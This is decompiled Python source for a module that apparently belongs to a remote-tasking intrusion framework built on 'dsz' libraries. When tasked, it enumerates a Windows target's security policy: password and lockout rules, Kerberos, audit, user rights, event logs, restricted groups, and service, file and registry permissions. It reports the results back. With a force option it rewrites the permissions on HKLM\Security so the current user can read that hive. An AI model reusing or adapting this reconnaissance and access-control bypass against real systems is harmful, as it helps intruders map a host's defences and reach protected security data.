# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: _Policy.py
import dsz
import dsz.lp
import dsz.user
import dsz.script
import sys
import xml.dom.minidom
from policy._RegistryPolicy import AdminTemplates, Ipsec, Srp, SecurityOptions
from policy._RegistryPolicy import SECURITY_XML_PATH
from policy._Reader import Reader
from policy._SecurityPolicy import SystemServices, FileSecurity, RegistrySecurity, RestrictedGroups, Privileges, EventLog, Kerberos, EventAudit, SystemAccess
from policy._Shared import SYSTEM_ACCESS, EVENT_AUDIT, KERBEROS_POLICY, REGISTRY_VALUES, PRIVILEGE_RIGHTS, APPLICATION_LOG, SECURITY_LOG, SYSTEM_LOG, FILE_SECURITY, REGISTRY_KEYS, SERVICES, RESTRICTED
RESOURCE_DIR = 'Dsz'
TAB = '\t'
TABCNT = 0

def TaskingMain(namespace):
    import mcl.target
    import mcl.tasking
    dsz.control.echo.Off()
    params = mcl.tasking.GetParameters()
    dsz.script.data.Start('Policy')
    if params['doComputer']:
        queryComputer(params)
    if params['doUser']:
        queryUser(params)
    dsz.script.data.End()
    dsz.script.data.Store()
    mcl.tasking.TaskSetStatus(mcl.target.CALL_SUCCEEDED)
    return True


def queryComputer(params):
    global TABCNT
    TABCNT += 1
    dsz.script.data.Start('Computer')
    dsz.ui.Echo(TAB * TABCNT + 'Computer Policy')
    dsz.ui.Echo('----------------------------------------------------------------------------------------')
    hklmReader = Reader('hklm', params)
    if params['software']:
        software = Srp('hklm')
        software.process(hklmReader)
        software.store(TABCNT)
    if params['ipsec']:
        ip = Ipsec('hklm')
        ip.process(hklmReader)
        ip.store(TABCNT)
    if params['templates']:
        templates = AdminTemplates('hklm', RESOURCE_DIR)
        templates.process(hklmReader, Srp.getActualPaths() + Ipsec.getActualPaths() + SecurityOptions.getActualPaths(RESOURCE_DIR))
        templates.store(TABCNT)
    if params['account'] or params['privileges'] or params['restricted'] or params['permissions'] or params['audit'] or params['options'] or params['log']:
        securityPolicy(params, hklmReader)
    hklmReader.cleanup()
    dsz.script.data.End()
    TABCNT -= 1


def processSecurityXml():
    path = '%s/%s/%s' % (dsz.lp.GetResourcesDirectory(), RESOURCE_DIR, SECURITY_XML_PATH)
    xmldoc = xml.dom.minidom.parse('%s/%s/%s' % (dsz.lp.GetResourcesDirectory(), RESOURCE_DIR, SECURITY_XML_PATH))
    settingList = xmldoc.getElementsByTagName('Setting')
    settingDict = {SYSTEM_ACCESS: {},EVENT_AUDIT: {},KERBEROS_POLICY: {},REGISTRY_VALUES: {},PRIVILEGE_RIGHTS: {},APPLICATION_LOG: {},SECURITY_LOG: {},SYSTEM_LOG: {},FILE_SECURITY: {},REGISTRY_KEYS: {},SERVICES: {},RESTRICTED: {}}
    for setting in settingList:
        fullpath = setting.getElementsByTagName('Path')[0].firstChild.data
        name = setting.getElementsByTagName('Name')[0].firstChild.data
        key = setting.getElementsByTagName('RegistryKey')[0].firstChild.data
        selector = fullpath.split('\\')[-1]
        if selector == 'Account Lockout Policy' or selector == 'Password Policy':
            settingDict[SYSTEM_ACCESS][key] = [
             fullpath, name, key]
        elif selector == 'Security Options' and (name == 'Accounts: Administrator account status' or name == 'Accounts: Guest account status' or name == 'Accounts: Rename administrator account' or name == 'Accounts: Rename guest account' or name == 'Network access: Allow anonymous SID/Name translation' or name == 'Network security: Force logoff when logon hours expire'):
            settingDict[SYSTEM_ACCESS][key] = [fullpath, name, key]
            settingDict[REGISTRY_VALUES][key] = [fullpath, name, key]
        elif selector == 'Security Options':
            settingDict[REGISTRY_VALUES][key] = [
             fullpath, name, key]
        elif selector == 'Audit Policy':
            settingDict[EVENT_AUDIT][key] = [
             fullpath, name, key]
        elif selector == 'Kerberos Policy':
            settingDict[KERBEROS_POLICY][key] = [
             fullpath, name, key]
        elif selector == 'User Rights Assignment':
            settingDict[PRIVILEGE_RIGHTS][key] = [
             fullpath, name, key]
        elif selector == 'Event Log':
            if name.__contains__('application'):
                settingDict[APPLICATION_LOG][key] = [
                 fullpath, name, key]
            elif name.__contains__('security'):
                settingDict[SECURITY_LOG][key] = [
                 fullpath, name, key]
            elif name.__contains__('system'):
                settingDict[SYSTEM_LOG][key] = [
                 fullpath, name, key]
            else:
                dsz.ui.Echo('ERROR: Unable to properly parse security XML file', dsz.ERROR)
                dsz.ui.Echo('Path: ' + fullpath, dsz.ERROR)
                dsz.ui.Echo('Name: ' + name, dsz.ERROR)
                dsz.ui.Echo('Key: ' + key, dsz.ERROR)
        elif selector == 'Restricted Groups':
            settingDict[RESTRICTED][key] = [
             fullpath, name, key]
        elif selector == 'System Services':
            settingDict[SERVICES][key] = [
             fullpath, name, key]
        elif selector == 'Registry':
            settingDict[REGISTRY_KEYS][key] = [
             fullpath, name, key]
        elif selector == 'File System':
            settingDict[FILE_SECURITY][key] = [
             fullpath, name, key]
        else:
            dsz.ui.Echo('ERROR: Unable to properly parse security XML file', dsz.ERROR)
            dsz.ui.Echo('Path: ' + fullpath, dsz.ERROR)
            dsz.ui.Echo('Name: ' + name, dsz.ERROR)
            dsz.ui.Echo('Key: ' + key, dsz.ERROR)

    return settingDict


def securityPolicy(params, hklmReader):
    settingDict = processSecurityXml()
    modifiedDacl = False
    if params['force'] and hklmReader.grabLocal and not dsz.user.windows.IsSystem():
        username = dsz.user.GetCurrent()
        dsz.ui.Echo('Giving ' + username + ' access to HKLM\\Security')
        modifiedDacl = dsz.cmd.Run('permissions -key L security -modify grant -sid ' + username)
    if params['account']:
        dsz.script.data.Start('Account')
        dsz.ui.Echo(TAB * TABCNT + 'Account Policy(Password, Account Lockout, Kerberos)')
        dsz.ui.Echo(TAB * TABCNT + '----------------------------------------------------------------------------------------')
        kerb = Kerberos('hklm')
        kerb.process(hklmReader, settingDict[KERBEROS_POLICY])
        kerb.store(TABCNT)
        accnt = SystemAccess('hklm')
        accnt.process(hklmReader, settingDict[SYSTEM_ACCESS])
        accnt.store(TABCNT)
        dsz.script.data.End()
    if params['audit']:
        event = EventAudit('hklm')
        event.process(hklmReader, settingDict[EVENT_AUDIT])
        event.store(TABCNT)
    if params['privileges']:
        ura = Privileges('hklm')
        ura.process(hklmReader, settingDict[PRIVILEGE_RIGHTS])
        ura.store(TABCNT)
    if params['options']:
        opt = SecurityOptions('hklm')
        opt.process(hklmReader, settingDict[REGISTRY_VALUES])
        opt.store(TABCNT)
    if params['log']:
        event = EventLog('hklm')
        event.process(hklmReader, settingDict)
        event.store(TABCNT)
    if params['restricted']:
        restricted = RestrictedGroups('hklm')
        restricted.process(hklmReader)
        restricted.store(TABCNT)
    if params['permissions']:
        dsz.script.data.Start('permissions')
        services = SystemServices('hklm')
        services.process(hklmReader)
        services.store(TABCNT)
        file = FileSecurity('hklm')
        file.process(hklmReader)
        file.store(TABCNT)
        reg = RegistrySecurity('hklm')
        reg.process(hklmReader)
        reg.store(TABCNT)
        dsz.script.data.End()
    if modifiedDacl:
        dsz.cmd.Run('stop permissions')


def queryUser(params):
    global TABCNT
    TABCNT += 1
    dsz.script.data.Start('User')
    dsz.ui.Echo(TAB * TABCNT + 'User Policy')
    dsz.ui.Echo('----------------------------------------------------------------------------------------')
    hkcuReader = Reader('hkcu', params)
    if params['software']:
        software = Srp('hkcu')
        software.process(hkcuReader)
        software.store(TABCNT)
    if params['templates']:
        templates = AdminTemplates('hkcu', RESOURCE_DIR)
        templates.process(hkcuReader, Srp.getActualPaths())
        templates.store(TABCNT)
    hkcuReader.cleanup()
    dsz.script.data.End()
    TABCNT -= 1


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)